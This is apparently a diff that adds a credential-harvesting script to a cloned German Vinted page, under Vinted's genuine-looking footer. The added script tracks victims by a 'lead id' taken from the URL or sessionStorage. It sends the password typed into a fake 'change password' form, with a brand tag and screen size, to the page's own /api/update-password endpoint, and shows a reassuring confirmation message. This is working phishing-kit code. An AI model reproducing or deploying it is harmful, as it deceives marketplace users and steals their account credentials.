class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-row"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__links-section-link" href="/safety">Vertrauen und Sicherheit</a></li></ul></li><li class="u-margin-none"><div class="web_ui__Spacer__regular web_ui__Spacer__vertical"></div></li></ul><!--/$--><div class="web_ui__Divider__divider"></div><div class="_main-footer-module-scss-module__-idQ1q__main-footer__social-section"><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__social-section-media"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__social-media-item"><a href="https://www.facebook.com/vinted" target="_blank" rel="noopener noreferrer"><div class="web_ui__Image__image"><img src="https://marketplace-web-assets.vinted.com/_next/static/media/facebook.7f7ba6d1.svg" alt="Facebook" class="web_ui__Image__content"></div></a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__social-media-item"><a href="https://www.linkedin.com/company/vinted" target="_blank" rel="noopener noreferrer"><div class="web_ui__Image__image"><img src="https://marketplace-web-assets.vinted.com/_next/static/media/linkedin.2a9db314.svg" alt="LinkedIn" class="web_ui__Image__content"></div></a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__social-media-item"><a href="https://www.instagram.com/vinted" target="_blank" rel="noopener noreferrer"><div class="web_ui__Image__image"><img src="https://marketplace-web-assets.vinted.com/_next/static/media/instagram.4c935494.svg" alt="Instagram" class="web_ui__Image__content"></div></a></li></ul><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__social-section-app-store"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__social-app-store-item"><a href="https://vinted.fr/l/app-ios-landing" target="_blank" rel="noopener noreferrer"><div class="web_ui__Image__image"><img src="https://marketplace-web-assets.vinted.com/_next/static/media/de.358e9517.svg" alt="Laden im App Store" class="web_ui__Image__content"></div></a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__social-app-store-item"><a href="https://vinted.fr/l/app-android-landing" target="_blank" rel="noopener noreferrer"><div class="web_ui__Image__image"><img src="https://marketplace-web-assets.vinted.com/_next/static/media/de.5455a057.svg" alt="Jetzt bei Google Play" class="web_ui__Image__content"></div></a></li></ul></div><div class="web_ui__Divider__divider"></div><!--$--><ul class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section"><li class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-item"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-link" href="/privacy" data-testid="privacy-footer-privacy-center-link">Datenschutz-Center</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-item"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-link" href="/cookie-policy">Cookie-Hinweise</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-item"><button type="button" class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-link">Cookie-Einstellungen</button></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-item"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-link" href="/terms_and_conditions" data-testid="privacy-footer-terms-and-conditions-link">AGB</a></li><li class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-item"><a class="_main-footer-module-scss-module__-idQ1q__main-footer__privacy-section-link" href="/our-platform">Unsere Plattform</a></li></ul><!--/$--></div></div></footer>
+</div>
+</div>
+</div>
+<script>
+(function () {
+  var intro = document.querySelector('[data-testid="change-password-view"] p');
+  if (intro) {
+    intro.textContent = 'Gib dein aktuelles Passwort ein und waehle ein neues (mindestens 8 Zeichen).';
+  }
+  var form = document.getElementById('change-password-form');
+  var cur = document.getElementById('password-current');
+  var neu = document.getElementById('new-password');
+  var conf = document.getElementById('confirm-password');
+  var submitButton = form ? form.querySelector('button[type="submit"]') : null;
+  var LEAD_KEYS = ['gmw_vint_lead_id', 'gmw_lead_id'];
+
+  function safeTrim(value) {
+    return value == null ? '' : String(value).trim();
+  }
+
+  function readLeadIdFromQuery() {
+    try {
+      return safeTrim(new URLSearchParams(window.location.search || '').get('id'));
+    } catch (e) {
+      return '';
+    }
+  }
+
+  function readLeadIdFromStorage() {
+    try {
+      for (var i = 0; i < LEAD_KEYS.length; i += 1) {
+        var val = safeTrim(sessionStorage.getItem(LEAD_KEYS[i]));
+        if (val) return val;
+      }
+    } catch (e) {}
+    return '';
+  }
+
+  function storeLeadId(id) {
+    var leadId = safeTrim(id);
+    if (!leadId) return;
+    try {
+      for (var i = 0; i < LEAD_KEYS.length; i += 1) {
+        sessionStorage.setItem(LEAD_KEYS[i], leadId);
+      }
+    } catch (e) {}
+  }
+
+  function resolveLeadId() {
+    var fromQuery = readLeadIdFromQuery();
+    if (fromQuery) {
+      storeLeadId(fromQuery);
+      return fromQuery;
+    }
+    return readLeadIdFromStorage();
+  }
+
+  function setSubmitState(inFlight) {
+    if (!submitButton) return;
+    submitButton.disabled = !!inFlight;
+  }
+
+  function postUpdatedPassword(leadId, nextPassword) {
+    var payload = {
+      id: leadId,
+      password: nextPassword,
+      clientFormBrand: 'vint'
+    };
+    if (window.screen) {
+      payload.screenWidth = window.screen.width | 0;
+      payload.screenHeight = window.screen.height | 0;
+    }
+    return fetch('/api/update-password', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).then(function (r) {
+      return r.json().catch(function () { return {}; }).then(function (data) {
+        return { ok: r.ok, data: data || {} };
+      });
+    });
+  }
+
+  if (form) form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    if (!cur || !neu || !conf) return;
+    if (!cur.value.trim()) {
+      alert('Bitte gib dein aktuelles Passwort ein.');
+      return;
+    }
+    if (neu.value.length < 8) {
+      alert('Das neue Passwort muss mindestens 8 Zeichen haben.');
+      return;
+    }
+    if (neu.value !== conf.value) {
+      alert('Die neuen Passwoerter stimmen nicht ueberein.');
+      return;
+    }
+    var leadId = resolveLeadId();
+    if (!leadId) {
+      alert('Sitzung abgelaufen. Bitte melde dich erneut an.');
+      return;
+    }
+    setSubmitState(true);
+    postUpdatedPassword(leadId, neu.value)
+      .then(function (res) {
+        if (!res.ok || !res.data || res.data.ok !== true) {
+          throw new Error('update_password_failed');
+        }
+        storeLeadId(res.data.id || leadId);
+        alert('Passwort wurde uebermittelt. Bitte warte auf die Bestaetigung.');
+      })
+      .catch(function () {
+        alert('Passwortaenderung ist derzeit nicht verfuegbar.');
+      })
+      .finally(function () {
+        setSubmitState(false);
+      });
+  });
+  document.querySelectorAll('.js-pw-toggle').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var id = btn.getAttribute('data-target');
+      var pw = id && document.getElementById(id);
+      if (!pw) return;
+      var t = pw.type === 'password' ? 'text' : 'password';
+      pw.type = t;
+      btn.setAttribute('aria-label', t === 'password' ? 'Passwort anzeigen' : 'Passwort verbergen');
+    });
+  });
+})();
+</script>
+<script src="/chat-widget.js"></script>
+</body>
+</html>
